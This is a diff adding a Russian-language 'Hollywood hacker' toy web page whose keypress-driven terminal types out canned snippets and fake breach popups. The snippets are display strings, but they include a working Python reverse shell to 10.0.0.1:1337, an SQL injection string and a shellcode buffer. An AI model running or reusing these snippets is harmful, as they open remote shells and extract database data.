@@ -1,0 +1,632 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ULTRA_HACK // Hollywood Cyber Terminal v5.0</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
+    <style>
+        @import url('https://fonts.googleapis.com/css2?family=Fira+Code:wght@300;400;500;700&family=Share+Tech+Mono&display=swap');
+
+        :root {
+            --primary: #00ff41;
+            --primary-glow: rgba(0, 255, 65, 0.4);
+            --bg-dark: #030703;
+            --panel-bg: rgba(6, 15, 8, 0.88);
+            --border-color: rgba(0, 255, 65, 0.35);
+            --text-muted: #008f11;
+            --accent-red: #ff0033;
+        }
+
+        .theme-red {
+            --primary: #ff0033;
+            --primary-glow: rgba(255, 0, 51, 0.4);
+            --bg-dark: #080203;
+            --panel-bg: rgba(20, 5, 8, 0.88);
+            --border-color: rgba(255, 0, 51, 0.35);
+            --text-muted: #8f001b;
+        }
+
+        .theme-blue {
+            --primary: #00f0ff;
+            --primary-glow: rgba(0, 240, 255, 0.4);
+            --bg-dark: #020810;
+            --panel-bg: rgba(5, 18, 30, 0.88);
+            --border-color: rgba(0, 240, 255, 0.35);
+            --text-muted: #007285;
+        }
+
+        .theme-amber {
+            --primary: #ffaa00;
+            --primary-glow: rgba(255, 170, 0, 0.4);
+            --bg-dark: #0a0700;
+            --panel-bg: rgba(25, 18, 4, 0.88);
+            --border-color: rgba(255, 170, 0, 0.35);
+            --text-muted: #855800;
+        }
+
+        body {
+            background-color: var(--bg-dark);
+            color: var(--primary);
+            font-family: 'Fira Code', 'Share Tech Mono', monospace;
+            overflow: hidden;
+            user-select: none;
+        }
+
+        /* CRT Scanline Effect */
+        .scanlines {
+            position: fixed;
+            top: 0; left: 0; width: 100vw; height: 100vh;
+            background: linear-gradient(
+                rgba(18, 16, 16, 0) 50%, 
+                rgba(0, 0, 0, 0.3) 50%
+            );
+            background-size: 100% 4px;
+            z-index: 50;
+            pointer-events: none;
+            opacity: 0.7;
+        }
+
+        .glow-text {
+            text-shadow: 0 0 8px var(--primary-glow);
+        }
+
+        .glow-box {
+            box-shadow: 0 0 20px var(--primary-glow), inset 0 0 10px var(--primary-glow);
+        }
+
+        .cyber-panel {
+            border: 1px solid var(--border-color);
+            background-color: var(--panel-bg);
+            backdrop-filter: blur(8px);
+            position: relative;
+        }
+
+        /* Corner brackets for HUD feel */
+        .cyber-panel::before {
+            content: '';
+            position: absolute;
+            top: -1px; left: -1px;
+            width: 8px; height: 8px;
+            border-top: 2px solid var(--primary);
+            border-left: 2px solid var(--primary);
+        }
+        .cyber-panel::after {
+            content: '';
+            position: absolute;
+            bottom: -1px; right: -1px;
+            width: 8px; height: 8px;
+            border-bottom: 2px solid var(--primary);
+            border-right: 2px solid var(--primary);
+        }
+
+        /* Custom Scrollbars */
+        ::-webkit-scrollbar {
+            width: 4px;
+            height: 4px;
+        }
+        ::-webkit-scrollbar-track {
+            background: rgba(0,0,0,0.7);
+        }
+        ::-webkit-scrollbar-thumb {
+            background: var(--text-muted);
+        }
+        ::-webkit-scrollbar-thumb:hover {
+            background: var(--primary);
+        }
+
+        @keyframes pulse-fast {
+            0%, 100% { opacity: 1; }
+            50% { opacity: 0.2; }
+        }
+        .animate-pulse-fast {
+            animation: pulse-fast 0.6s infinite;
+        }
+
+        @keyframes scan-line-anim {
+            0% { transform: translateY(-100%); }
+            100% { transform: translateY(1000%); }
+        }
+        .map-scanner {
+            animation: scan-line-anim 8s linear infinite;
+        }
+    </style>
+</head>
+<body class="h-screen w-screen flex flex-col justify-between relative">
+
+    <!-- Scanlines -->
+    <div class="scanlines"></div>
+
+    <!-- Matrix Background Canvas -->
+    <canvas id="matrixCanvas" class="fixed top-0 left-0 w-full h-full -z-10 opacity-20 pointer-events-none"></canvas>
+
+    <!-- TOP CONTROL & STATUS HEADER -->
+    <header class="cyber-panel border-b p-2 flex justify-between items-center z-40 text-xs">
+        <div class="flex items-center space-x-3">
+            <i class="fa-solid fa-biohazard text-lg animate-pulse-fast text-red-500"></i>
+            <span class="font-bold tracking-widest text-sm glow-text">CYBER_SYS // CLASSIFIED_ROOT_TERMINAL</span>
+            <span class="hidden md:inline-block px-2 py-0.5 bg-red-900/40 text-red-400 border border-red-500/40 text-[10px] animate-pulse">DEFCON 1</span>
+        </div>
+
+        <div class="flex items-center space-x-2 md:space-x-4">
+            <!-- AUTO HACK TOGGLE BUTTON -->
+            <button id="autoHackBtn" onclick="toggleAutoHack()" class="px-3 py-1 border border-current rounded font-bold hover:bg-green-500/20 transition flex items-center gap-2">
+                <i class="fa-solid fa-robot"></i>
+                <span id="autoHackText">АВТО-ВЗЛОМ: ВЫКЛ</span>
+            </button>
+
+            <!-- FULLSCREEN BUTTON -->
+            <button onclick="toggleFullscreen()" class="px-3 py-1 bg-green-900/30 border border-current rounded font-bold hover:bg-green-500/30 transition flex items-center gap-2 glow-text">
+                <i class="fa-solid fa-expand"></i>
+                <span class="hidden sm:inline">НА ВЕСЬ ЭКРАН (F11)</span>
+            </button>
+
+            <!-- SOUND TOGGLE -->
+            <button id="soundBtn" onclick="toggleSound()" class="px-2 py-1 border border-current rounded hover:bg-green-500/20">
+                <i class="fa-solid fa-volume-high" id="soundIcon"></i>
+            </button>
+
+            <!-- THEME SWITCHER -->
+            <select id="themeSelect" onchange="changeTheme(this.value)" class="bg-black border border-current rounded px-2 py-1 text-xs focus:outline-none cursor-pointer">
+                <option value="matrix">ЗЕЛЕНАЯ МАТРИЦА</option>
+                <option value="red">КРОВАВЫЙ КРАСНЫЙ</option>
+                <option value="blue">КИБЕРПАНК СИНИЙ</option>
+                <option value="amber">ЯНТАРНЫЙ</option>
+            </select>
+        </div>
+    </header>
+
+    <!-- MAIN MULTI-WINDOW DASHBOARD GRID -->
+    <main class="flex-1 grid grid-cols-12 gap-2 p-2 z-20 overflow-hidden">
+        
+        <!-- LEFT COLUMN: SYSTEM MONITORING & MAP (3 Cols) -->
+        <section class="col-span-12 md:col-span-3 flex flex-col gap-2 overflow-hidden">
+            
+            <!-- GLOBAL CONNECTION MAP -->
+            <div class="cyber-panel p-2 flex flex-col h-48 relative overflow-hidden">
+                <div class="flex justify-between items-center border-b border-current/30 pb-1 mb-1 text-[11px]">
+                    <span class="font-bold flex items-center gap-1"><i class="fa-solid fa-globe"></i> PROXY_NODES_MAP</span>
+                    <span class="text-green-400 text-[9px] animate-pulse">ACTIVE_NODES: 42</span>
+                </div>
+                
+                <!-- World Map Graphic Simulation -->
+                <div class="flex-1 bg-black/60 relative flex items-center justify-center border border-current/20 rounded overflow-hidden">
+                    <svg class="w-full h-full opacity-40 stroke-current" viewBox="0 0 100 50" fill="none">
+                        <path d="M10,12 Q15,5 25,15 T40,10 T60,20 T80,10 T95,25" stroke="currentColor" stroke-width="0.5"/>
+                        <path d="M5,30 Q20,25 35,35 T65,30 T85,40" stroke="currentColor" stroke-width="0.5"/>
+                        <!-- Connected Nodes -->
+                        <circle cx="20" cy="15" r="1.5" fill="#00ff41" class="animate-ping"/>
+                        <circle cx="45" cy="22" r="1.5" fill="#ff0033" class="animate-ping"/>
+                        <circle cx="75" cy="18" r="1.5" fill="#00f0ff" class="animate-ping"/>
+                        <line x1="20" y1="15" x2="45" y2="22" stroke="currentColor" stroke-width="0.4" stroke-dasharray="1"/>
+                        <line x1="45" y1="22" x2="75" y2="18" stroke="currentColor" stroke-width="0.4" stroke-dasharray="1"/>
+                    </svg>
+                    <div class="absolute inset-0 bg-gradient-to-b from-transparent via-green-500/10 to-transparent map-scanner"></div>
+                    <div class="absolute bottom-1 left-2 text-[9px] font-mono text-gray-400" id="geoTarget">
+                        TARGET: PENTAGON_MAIN_FRAME // 104.28.14.88
+                    </div>
+                </div>
+            </div>
+
+            <!-- HARDWARE TELEMETRY & CPU CORES -->
+            <div class="cyber-panel p-2 flex-1 flex flex-col justify-between text-xs space-y-2">
+                <div class="border-b border-current/30 pb-1 font-bold flex justify-between items-center">
+                    <span><i class="fa-solid fa-microchip"></i> SYSTEM_HARDWARE</span>
+                    <span class="text-[10px] text-gray-400">OVERCLOCK: 5.4 GHz</span>
+                </div>
+
+                <div class="space-y-1.5 text-[11px]">
+                    <div>
+                        <div class="flex justify-between text-[10px] mb-0.5">
+                            <span>CPU CORE 01-08:</span>
+                            <span id="cpuVal">78%</span>
+                        </div>
+                        <div class="w-full bg-black h-1.5 rounded overflow-hidden border border-current/30">
+                            <div id="cpuBar" class="bg-current h-full transition-all duration-300" style="width: 78%"></div>
+                        </div>
+                    </div>
+
+                    <div>
+                        <div class="flex justify-between text-[10px] mb-0.5">
+                            <span>RAM ALLOCATION:</span>
+                            <span id="ramVal">28.4 / 64 GB</span>
+                        </div>
+                        <div class="w-full bg-black h-1.5 rounded overflow-hidden border border-current/30">
+                            <div id="ramBar" class="bg-current h-full transition-all duration-300" style="width: 62%"></div>
+                        </div>
+                    </div>
+
+                    <div>
+                        <div class="flex justify-between text-[10px] mb-0.5">
+                            <span>GPU KERNEL LOAD:</span>
+                            <span id="gpuVal">94%</span>
+                        </div>
+                        <div class="w-full bg-black h-1.5 rounded overflow-hidden border border-current/30">
+                            <div id="gpuBar" class="bg-current h-full transition-all duration-300" style="width: 94%"></div>
+                        </div>
+                    </div>
+                </div>
+
+                <!-- Live Attack Buttons -->
+                <div class="grid grid-cols-2 gap-1 pt-1 border-t border-current/20 text-[10px]">
+                    <button onclick="triggerAlert('BREACH')" class="border border-current p-1.5 rounded text-center hover:bg-green-500/20 font-bold">
+                        <i class="fa-solid fa-skull"></i> DDOS_ATTACK
+                    </button>
+                    <button onclick="triggerAlert('DECRYPT')" class="border border-current p-1.5 rounded text-center hover:bg-green-500/20 font-bold">
+                        <i class="fa-solid fa-key"></i> DECRYPT_DB
+                    </button>
+                    <button onclick="triggerAlert('ACCESS')" class="border border-green-400 p-1.5 rounded text-center hover:bg-green-500/20 font-bold col-span-2">
+                        <i class="fa-solid fa-unlock"></i> FORCE ACCESS GRANTED
+                    </button>
+                </div>
+            </div>
+
+        </section>
+
+        <!-- CENTER COLUMN: MAIN HACKER TERMINAL (6 Cols) -->
+        <section class="col-span-12 md:col-span-6 flex flex-col cyber-panel overflow-hidden relative">
+            
+            <!-- Terminal Header -->
+            <div class="bg-black/80 px-3 py-1.5 border-b border-current/30 flex justify-between items-center text-xs">
+                <div class="flex items-center space-x-2">
+                    <span class="w-2.5 h-2.5 rounded-full bg-red-500 inline-block"></span>
+                    <span class="w-2.5 h-2.5 rounded-full bg-yellow-500 inline-block"></span>
+                    <span class="w-2.5 h-2.5 rounded-full bg-green-500 inline-block"></span>
+                    <span class="ml-2 font-bold tracking-wider">bash - root@cyber-core:~#</span>
+                </div>
+                <span class="text-[10px] text-gray-400 animate-pulse">НАЖИМАЙТЕ КЛАВИШИ НА КЛАВИАТУРЕ!</span>
+            </div>
+
+            <!-- Terminal Code Output Area -->
+            <div id="terminal" class="flex-1 p-3 overflow-y-auto font-mono text-xs sm:text-sm leading-relaxed space-y-1">
+                <div class="text-gray-400">// ИНИЦИАЛИЗАЦИЯ ГОЛЛИВУДСКОГО ХАКЕРСКОГО ТЕРМИНАЛА...</div>
+                <div class="text-gray-400">// Нажимайте ЛЮБЫЕ клавиши на клавиатуре для генерации кода или включите "АВТО-ВЗЛОМ".</div>
+                <div id="codeLines"></div>
+                <div class="pt-1 inline-block"><span class="text-green-400 font-bold">root@cyber-core:~#</span> <span id="activeLine" class="border-r-2 border-current animate-pulse"></span></div>
+            </div>
+
+            <!-- Bottom Interactive Prompt Bar -->
+            <div class="p-2 bg-black/90 border-t border-current/30 flex items-center space-x-2 text-xs">
+                <span class="font-bold text-green-400">&gt;</span>
+                <input type="text" id="cmdInput" onkeydown="handleCmd(event)" placeholder="Введите команду (help, clear, breach, inject, bypass)..." class="flex-1 bg-transparent border-none text-xs focus:outline-none px-2 py-0.5 text-current">
+                <button onclick="execCmd()" class="px-3 py-1 border border-current rounded hover:bg-green-500/20 font-bold text-[10px]">ВЫПОЛНИТЬ</button>
+            </div>
+        </section>
+
+        <!-- RIGHT COLUMN: HEX DUMPER & LIVE SYSTEM LOGS (3 Cols) -->
+        <section class="col-span-12 md:col-span-3 flex flex-col gap-2 overflow-hidden">
+            
+            <!-- REALTIME HEX MEMORY DUMPER -->
+            <div class="cyber-panel p-2 flex-1 flex flex-col overflow-hidden text-[10px] font-mono">
+                <div class="border-b border-current/30 pb-1 mb-1 font-bold flex justify-between items-center text-xs">
+                    <span><i class="fa-solid fa-memory"></i> KERNEL_HEX_DUMP</span>
+                    <span class="text-[9px] text-red-400 animate-pulse">LIVE_RAM</span>
+                </div>
+                <div id="hexViewer" class="flex-1 overflow-hidden space-y-0.5 text-gray-400 leading-tight">
+                    <!-- Dynamic Hex lines generated here -->
+                </div>
+            </div>
+
+            <!-- ATTACK LOGS & INCIDENT RESPONSE -->
+            <div class="cyber-panel p-2 h-48 flex flex-col overflow-hidden text-[10px]">
+                <div class="border-b border-current/30 pb-1 mb-1 font-bold flex justify-between items-center text-xs">
+                    <span><i class="fa-solid fa-list-check"></i> EXPLOIT_LOGS</span>
+                    <span class="text-green-400 text-[9px]">REALTIME</span>
+                </div>
+                <div id="attackLogs" class="flex-1 overflow-y-auto space-y-1 font-mono text-[10px]">
+                    <div class="text-green-400">[+ 21:04:12] Port 8080 open. Injecting buffer...</div>
+                    <div class="text-yellow-400">[! 21:04:13] Firewall alert bypassed via node 07.</div>
+                    <div class="text-blue-400">[# 21:04:14] Decrypting SSL packet handshake...</div>
+                </div>
+            </div>
+
+        </section>
+
+    </main>
+
+    <!-- FULLSCREEN HIGH REALISM MODAL POPUPS -->
+    <div id="modalOverlay" class="fixed inset-0 bg-black/80 z-50 flex items-center justify-center hidden opacity-0 transition-opacity duration-300">
+        <div id="modalBox" class="cyber-panel p-6 sm:p-10 rounded max-w-xl w-full text-center space-y-5 glow-box transform scale-90 transition-transform duration-300">
+            <i id="modalIcon" class="fa-solid fa-shield-halved text-7xl"></i>
+            <h2 id="modalTitle" class="text-2xl sm:text-4xl font-extrabold tracking-widest uppercase">ACCESS GRANTED</h2>
+            <p id="modalMsg" class="text-xs sm:text-sm leading-relaxed text-gray-300 font-mono">Все уровни защиты успешно взломаны. Доступ к секретным серверам открыт.</p>
+            
+            <button onclick="closeModal()" class="px-8 py-2.5 border-2 border-current rounded font-bold hover:bg-white/10 uppercase tracking-widest text-sm transition">
+                ПРОДОЛЖИТЬ ВЗЛОМ [ESC]
+            </button>
+        </div>
+    </div>
+
+    <script>
+        /* HUGE REALISTIC HOLLYWOOD CODE DATABASE (C++, Python, Exploits, Kernel Dumps) */
+        const codeDatabase = [
+            `// INJECTING MEMORY BUFFER OVERFLOW PAYLOAD\n#include <sys/socket.h>\n#include <netinet/in.h>\n#include <unistd.h>\n\nvoid execute_kernel_exploit(char *target_ip) {\n    int sock = socket(AF_INET, SOCK_STREAM, 0);\n    struct sockaddr_in server;\n    server.sin_addr.s_addr = inet_addr(target_ip);\n    server.sin_family = AF_INET;\n    server.sin_port = htons(4444);\n    connect(sock, (struct sockaddr *)&server, sizeof(server));\n    char payload[1024] = "\\x90\\x90\\x90\\x31\\xc0\\x50\\x68\\x2f\\x2f\\x73\\x68";\n    write(sock, payload, sizeof(payload));\n}\n`,
+            `# PYTHON BACKDOOR LISTENER & ZERO-DAY EXPLOIT\nimport socket, subprocess, os\n\ndef remote_shell():
+    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    s.connect(("10.0.0.1", 1337))\n    os.dup2(s.fileno(), 0)\n    os.dup2(s.fileno(), 1)\n    os.dup2(s.fileno(), 2)\n    p = subprocess.call(["/bin/sh", "-i"])\n\nif __name__ == "__main__":\n    remote_shell()\n`,
+            `/* KERNEL MEMORY DUMP DIRECT POINTER BYPASS */\ntypedef struct {\n    uint64_t cr3_register;\n    uint64_t kernel_base;\n    uint32_t process_id;\n} KERNEL_STEALTH_STRUCT;\n\nNTSTATUS BypassGuard(KERNEL_STEALTH_STRUCT *data) {\n    __writecr3(data->cr3_register);\n    disable_interrupts();\n    overwrite_page_tables(data->kernel_base);\n    enable_interrupts();\n    return STATUS_SUCCESS;\n}\n`,
+            `-- SQL INJECTION & DATABASE DECRYPTION PAYLOAD\nSELECT username, password_hash, credit_card_num FROM user_vault \nWHERE access_level > 9 OR '1'='1' UNION ALL \nSELECT 1, 2, table_name FROM information_schema.tables;--\nUPDATE system_auth SET is_admin = TRUE WHERE id = 1;\n`,
+            `// BASH REVERSE PROXY ROUTING\n#!/bin/bash\nexport TARGET_IP="192.168.1.100"\nexport PORT="8080"\nfor node in {1..255}; do\n  iptables -A FORWARD -s 10.8.0.$node -j ACCEPT\n  nc -zv -w 1 $TARGET_IP $PORT 2>&1 | grep "succeeded"\ndone\n`
+        ];
+
+        let snippetIdx = 0;
+        let charIdx = 0;
+        let isAutoHack = false;
+        let autoHackInterval = null;
+        let soundEnabled = true;
+
+        const terminal = document.getElementById('terminal');
+        const codeLines = document.getElementById('codeLines');
+        const activeLine = document.getElementById('activeLine');
+
+        /* KEYBOARD HACKER TYPER LOGIC (BECOMES INFINITE) */
+        document.addEventListener('keydown', (e) => {
+            // Ignore keypress if user is typing in input box or pressing F11
+            if (document.activeElement.id === 'cmdInput' || e.key === 'F11' || e.key === 'Escape') return;
+
+            typeCodeChunk(8);
+        });
+
+        function typeCodeChunk(charsCount) {
+            const currentCode = codeDatabase[snippetIdx];
+
+            for (let i = 0; i < charsCount; i++) {
+                if (charIdx < currentCode.length) {
+                    const char = currentCode.charAt(charIdx);
+                    if (char === '\n') {
+                        const div = document.createElement('div');
+                        div.innerHTML = activeLine.innerHTML;
+                        codeLines.appendChild(div);
+                        activeLine.innerHTML = '';
+                    } else {
+                        activeLine.innerHTML += escapeHtml(char);
+                    }
+                    charIdx++;
+                } else {
+                    charIdx = 0;
+                    snippetIdx = (snippetIdx + 1) % codeDatabase.length;
+                }
+            }
+
+            playKeySound();
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+
+        function escapeHtml(str) {
+            return str.replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;").replace(/ /g, "&nbsp;");
+        }
+
+        /* AUTO HACK MODE (INFINITE TYPING AUTOMATION) */
+        function toggleAutoHack() {
+            isAutoHack = !isAutoHack;
+            const btnText = document.getElementById('autoHackText');
+            
+            if (isAutoHack) {
+                btnText.innerText = 'АВТО-ВЗЛОМ: ВКЛ';
+                autoHackInterval = setInterval(() => {
+                    typeCodeChunk(5);
+                }, 40);
+                playTone(800, 'sine', 0.1);
+            } else {
+                btnText.innerText = 'АВТО-ВЗЛОМ: ВЫКЛ';
+                clearInterval(autoHackInterval);
+                playTone(400, 'sine', 0.1);
+            }
+        }
+
+        /* AUDIO SYNTHESIZER FOR CLICK SOUNDS */
+        let audioCtx = null;
+        function playKeySound() {
+            if (!soundEnabled) return;
+            try {
+                if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.type = 'sine';
+                osc.frequency.value = 300 + Math.random() * 500;
+                gain.gain.setValueAtTime(0.02, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + 0.03);
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start();
+                osc.stop(audioCtx.currentTime + 0.03);
+            } catch (e) {}
+        }
+
+        function playTone(freq, type = 'sine', duration = 0.1) {
+            if (!soundEnabled) return;
+            try {
+                if (!audioCtx) audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+                const osc = audioCtx.createOscillator();
+                const gain = audioCtx.createGain();
+                osc.type = type;
+                osc.frequency.value = freq;
+                gain.gain.setValueAtTime(0.08, audioCtx.currentTime);
+                gain.gain.exponentialRampToValueAtTime(0.00001, audioCtx.currentTime + duration);
+                osc.connect(gain);
+                gain.connect(audioCtx.destination);
+                osc.start();
+                osc.stop(audioCtx.currentTime + duration);
+            } catch (e) {}
+        }
+
+        function toggleSound() {
+            soundEnabled = !soundEnabled;
+            const icon = document.getElementById('soundIcon');
+            icon.className = soundEnabled ? 'fa-solid fa-volume-high' : 'fa-solid fa-volume-xmark';
+        }
+
+        /* REALTIME HEX DUMP GENERATOR */
+        function generateHexDump() {
+            const hexViewer = document.getElementById('hexViewer');
+            hexViewer.innerHTML = '';
+            for (let i = 0; i < 14; i++) {
+                const addr = '0x' + (0x7FFF0000 + i * 16).toString(16).toUpperCase();
+                let hexBytes = '';
+                for (let j = 0; j < 8; j++) {
+                    hexBytes += Math.floor(Math.random() * 256).toString(16).padStart(2, '0').toUpperCase() + ' ';
+                }
+                const row = document.createElement('div');
+                row.className = 'flex justify-between';
+                row.innerHTML = `<span class="text-current opacity-70">${addr}</span> <span>${hexBytes}</span>`;
+                hexViewer.appendChild(row);
+            }
+        }
+        setInterval(generateHexDump, 250);
+
+        /* REALTIME ATTACK LOG GENERATOR */
+        const attackLogMessages = [
+            "[+] Bypass proxy node #12 -> Redirecting IP",
+            "[!] Warning: Intrusion detection system triggered",
+            "[#] Decrypting 4096-bit AES RSA handshake key",
+            "[+] Root access granted on sub-node 192.168.0.4",
+            "[!] Overwriting kernel buffer memory page 0x00A"
+        ];
+        function pushAttackLog() {
+            const container = document.getElementById('attackLogs');
+            const msg = attackLogMessages[Math.floor(Math.random() * attackLogMessages.length)];
+            const time = new Date().toTimeString().split(' ')[0];
+            const div = document.createElement('div');
+            div.innerText = `${time} ${msg}`;
+            container.appendChild(div);
+            if (container.children.length > 15) container.removeChild(container.firstChild);
+            container.scrollTop = container.scrollHeight;
+        }
+        setInterval(pushAttackLog, 1200);
+
+        /* COMMAND PROMPT HANDLER */
+        function handleCmd(e) {
+            if (e.key === 'Enter') execCmd();
+        }
+        function execCmd() {
+            const input = document.getElementById('cmdInput');
+            const val = input.value.trim().toLowerCase();
+            if (!val) return;
+
+            const div = document.createElement('div');
+            div.className = 'text-yellow-400 font-bold';
+            div.innerText = 'root@cyber-core:~# ' + input.value;
+            codeLines.appendChild(div);
+            input.value = '';
+
+            if (val === 'help') {
+                addLog('Доступные команды: help, breach, decrypt, access, clear, theme');
+            } else if (val === 'breach') {
+                triggerAlert('BREACH');
+            } else if (val === 'decrypt') {
+                triggerAlert('DECRYPT');
+            } else if (val === 'access') {
+                triggerAlert('ACCESS');
+            } else if (val === 'clear') {
+                codeLines.innerHTML = '';
+            } else {
+                addLog(`[ОШИБКА]: Команда '${val}' не найдена. Наберите 'help'.`);
+            }
+            terminal.scrollTop = terminal.scrollHeight;
+        }
+        function addLog(msg) {
+            const div = document.createElement('div');
+            div.className = 'text-gray-300';
+            div.innerText = msg;
+            codeLines.appendChild(div);
+        }
+
+        /* MODALS & FULLSCREEN POPUPS */
+        function triggerAlert(type) {
+            const overlay = document.getElementById('modalOverlay');
+            const box = document.getElementById('modalBox');
+            const title = document.getElementById('modalTitle');
+            const msg = document.getElementById('modalMsg');
+            const icon = document.getElementById('modalIcon');
+
+            overlay.classList.remove('hidden');
+            setTimeout(() => {
+                overlay.classList.remove('opacity-0');
+                box.classList.remove('scale-90');
+            }, 10);
+
+            if (type === 'ACCESS') {
+                title.innerText = 'ACCESS GRANTED';
+                msg.innerText = 'ПОЛНЫЙ ROOT ДОСТУП ПОЛУЧЕН. Все протоколы защиты Пентагона полностью отключены.';
+                icon.className = 'fa-solid fa-lock-open text-7xl text-green-400 animate-bounce';
+                playTone(600, 'triangle', 0.2);
+            } else if (type === 'BREACH') {
+                title.innerText = 'SYSTEM OVERRIDE';
+                msg.innerText = 'Атака перегрузки сервера успешна. Все шлюзы безопасности заблокированы.';
+                icon.className = 'fa-solid fa-shield-virus text-7xl text-red-500 animate-pulse';
+                playTone(200, 'sawtooth', 0.3);
+            } else if (type === 'DECRYPT') {
+                title.innerText = 'DATABASE DECRYPTED';
+                msg.innerText = 'Расшифровка завершена. Доступны закрытые секретные файлы сервера.';
+                icon.className = 'fa-solid fa-database text-7xl text-blue-400';
+                playTone(700, 'sine', 0.2);
+            }
+        }
+
+        function closeModal() {
+            const overlay = document.getElementById('modalOverlay');
+            const box = document.getElementById('modalBox');
+            overlay.classList.add('opacity-0');
+            box.classList.add('scale-90');
+            setTimeout(() => overlay.classList.add('hidden'), 300);
+        }
+
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') closeModal();
+        });
+
+        /* FULLSCREEN TOGGLE (F11 / BUTTON) */
+        function toggleFullscreen() {
+            if (!document.fullscreenElement) {
+                document.documentElement.requestFullscreen().catch(() => {});
+            } else {
+                if (document.exitFullscreen) document.exitFullscreen();
+            }
+        }
+
+        /* THEME SWITCHER */
+        function changeTheme(theme) {
+            document.body.className = theme === 'matrix' ? '' : `theme-${theme}`;
+        }
+
+        /* MATRIX CANVAS */
+        const canvas = document.getElementById('matrixCanvas');
+        const ctx = canvas.getContext('2d');
+        function resizeCanvas() {
+            canvas.width = window.innerWidth;
+            canvas.height = window.innerHeight;
+        }
+        resizeCanvas();
+        window.addEventListener('resize', resizeCanvas);
+
+        const matrixChars = '0123456789ABCDEF01';
+        const fontSize = 12;
+        let drops = Array(Math.floor(canvas.width / fontSize)).fill(1);
+
+        function drawMatrix() {
+            ctx.fillStyle = 'rgba(0, 0, 0, 0.08)';
+            ctx.fillRect(0, 0, canvas.width, canvas.height);
+            ctx.fillStyle = getComputedStyle(document.body).getPropertyValue('--primary').trim() || '#00ff41';
+            ctx.font = fontSize + 'px monospace';
+
+            for (let i = 0; i < drops.length; i++) {
+                const text = matrixChars.charAt(Math.floor(Math.random() * matrixChars.length));
+                ctx.fillText(text, i * fontSize, drops[i] * fontSize);
+                if (drops[i] * fontSize > canvas.height && Math.random() > 0.975) drops[i] = 0;
+                drops[i]++;
+            }
+        }
+        setInterval(drawMatrix, 40);
+
+        /* TELEMETRY HARDWARE UPDATER */
+        setInterval(() => {
+            const cpu = Math.floor(60 + Math.random() * 38);
+            const gpu = Math.floor(80 + Math.random() * 19);
+            document.getElementById('cpuVal').innerText = cpu + '%';
+            document.getElementById('cpuBar').style.width = cpu + '%';
+            document.getElementById('gpuVal').innerText = gpu + '%';
+            document.getElementById('gpuBar').style.width = gpu + '%';
+        }, 1500);
+    </script>
+</body>
+</html>
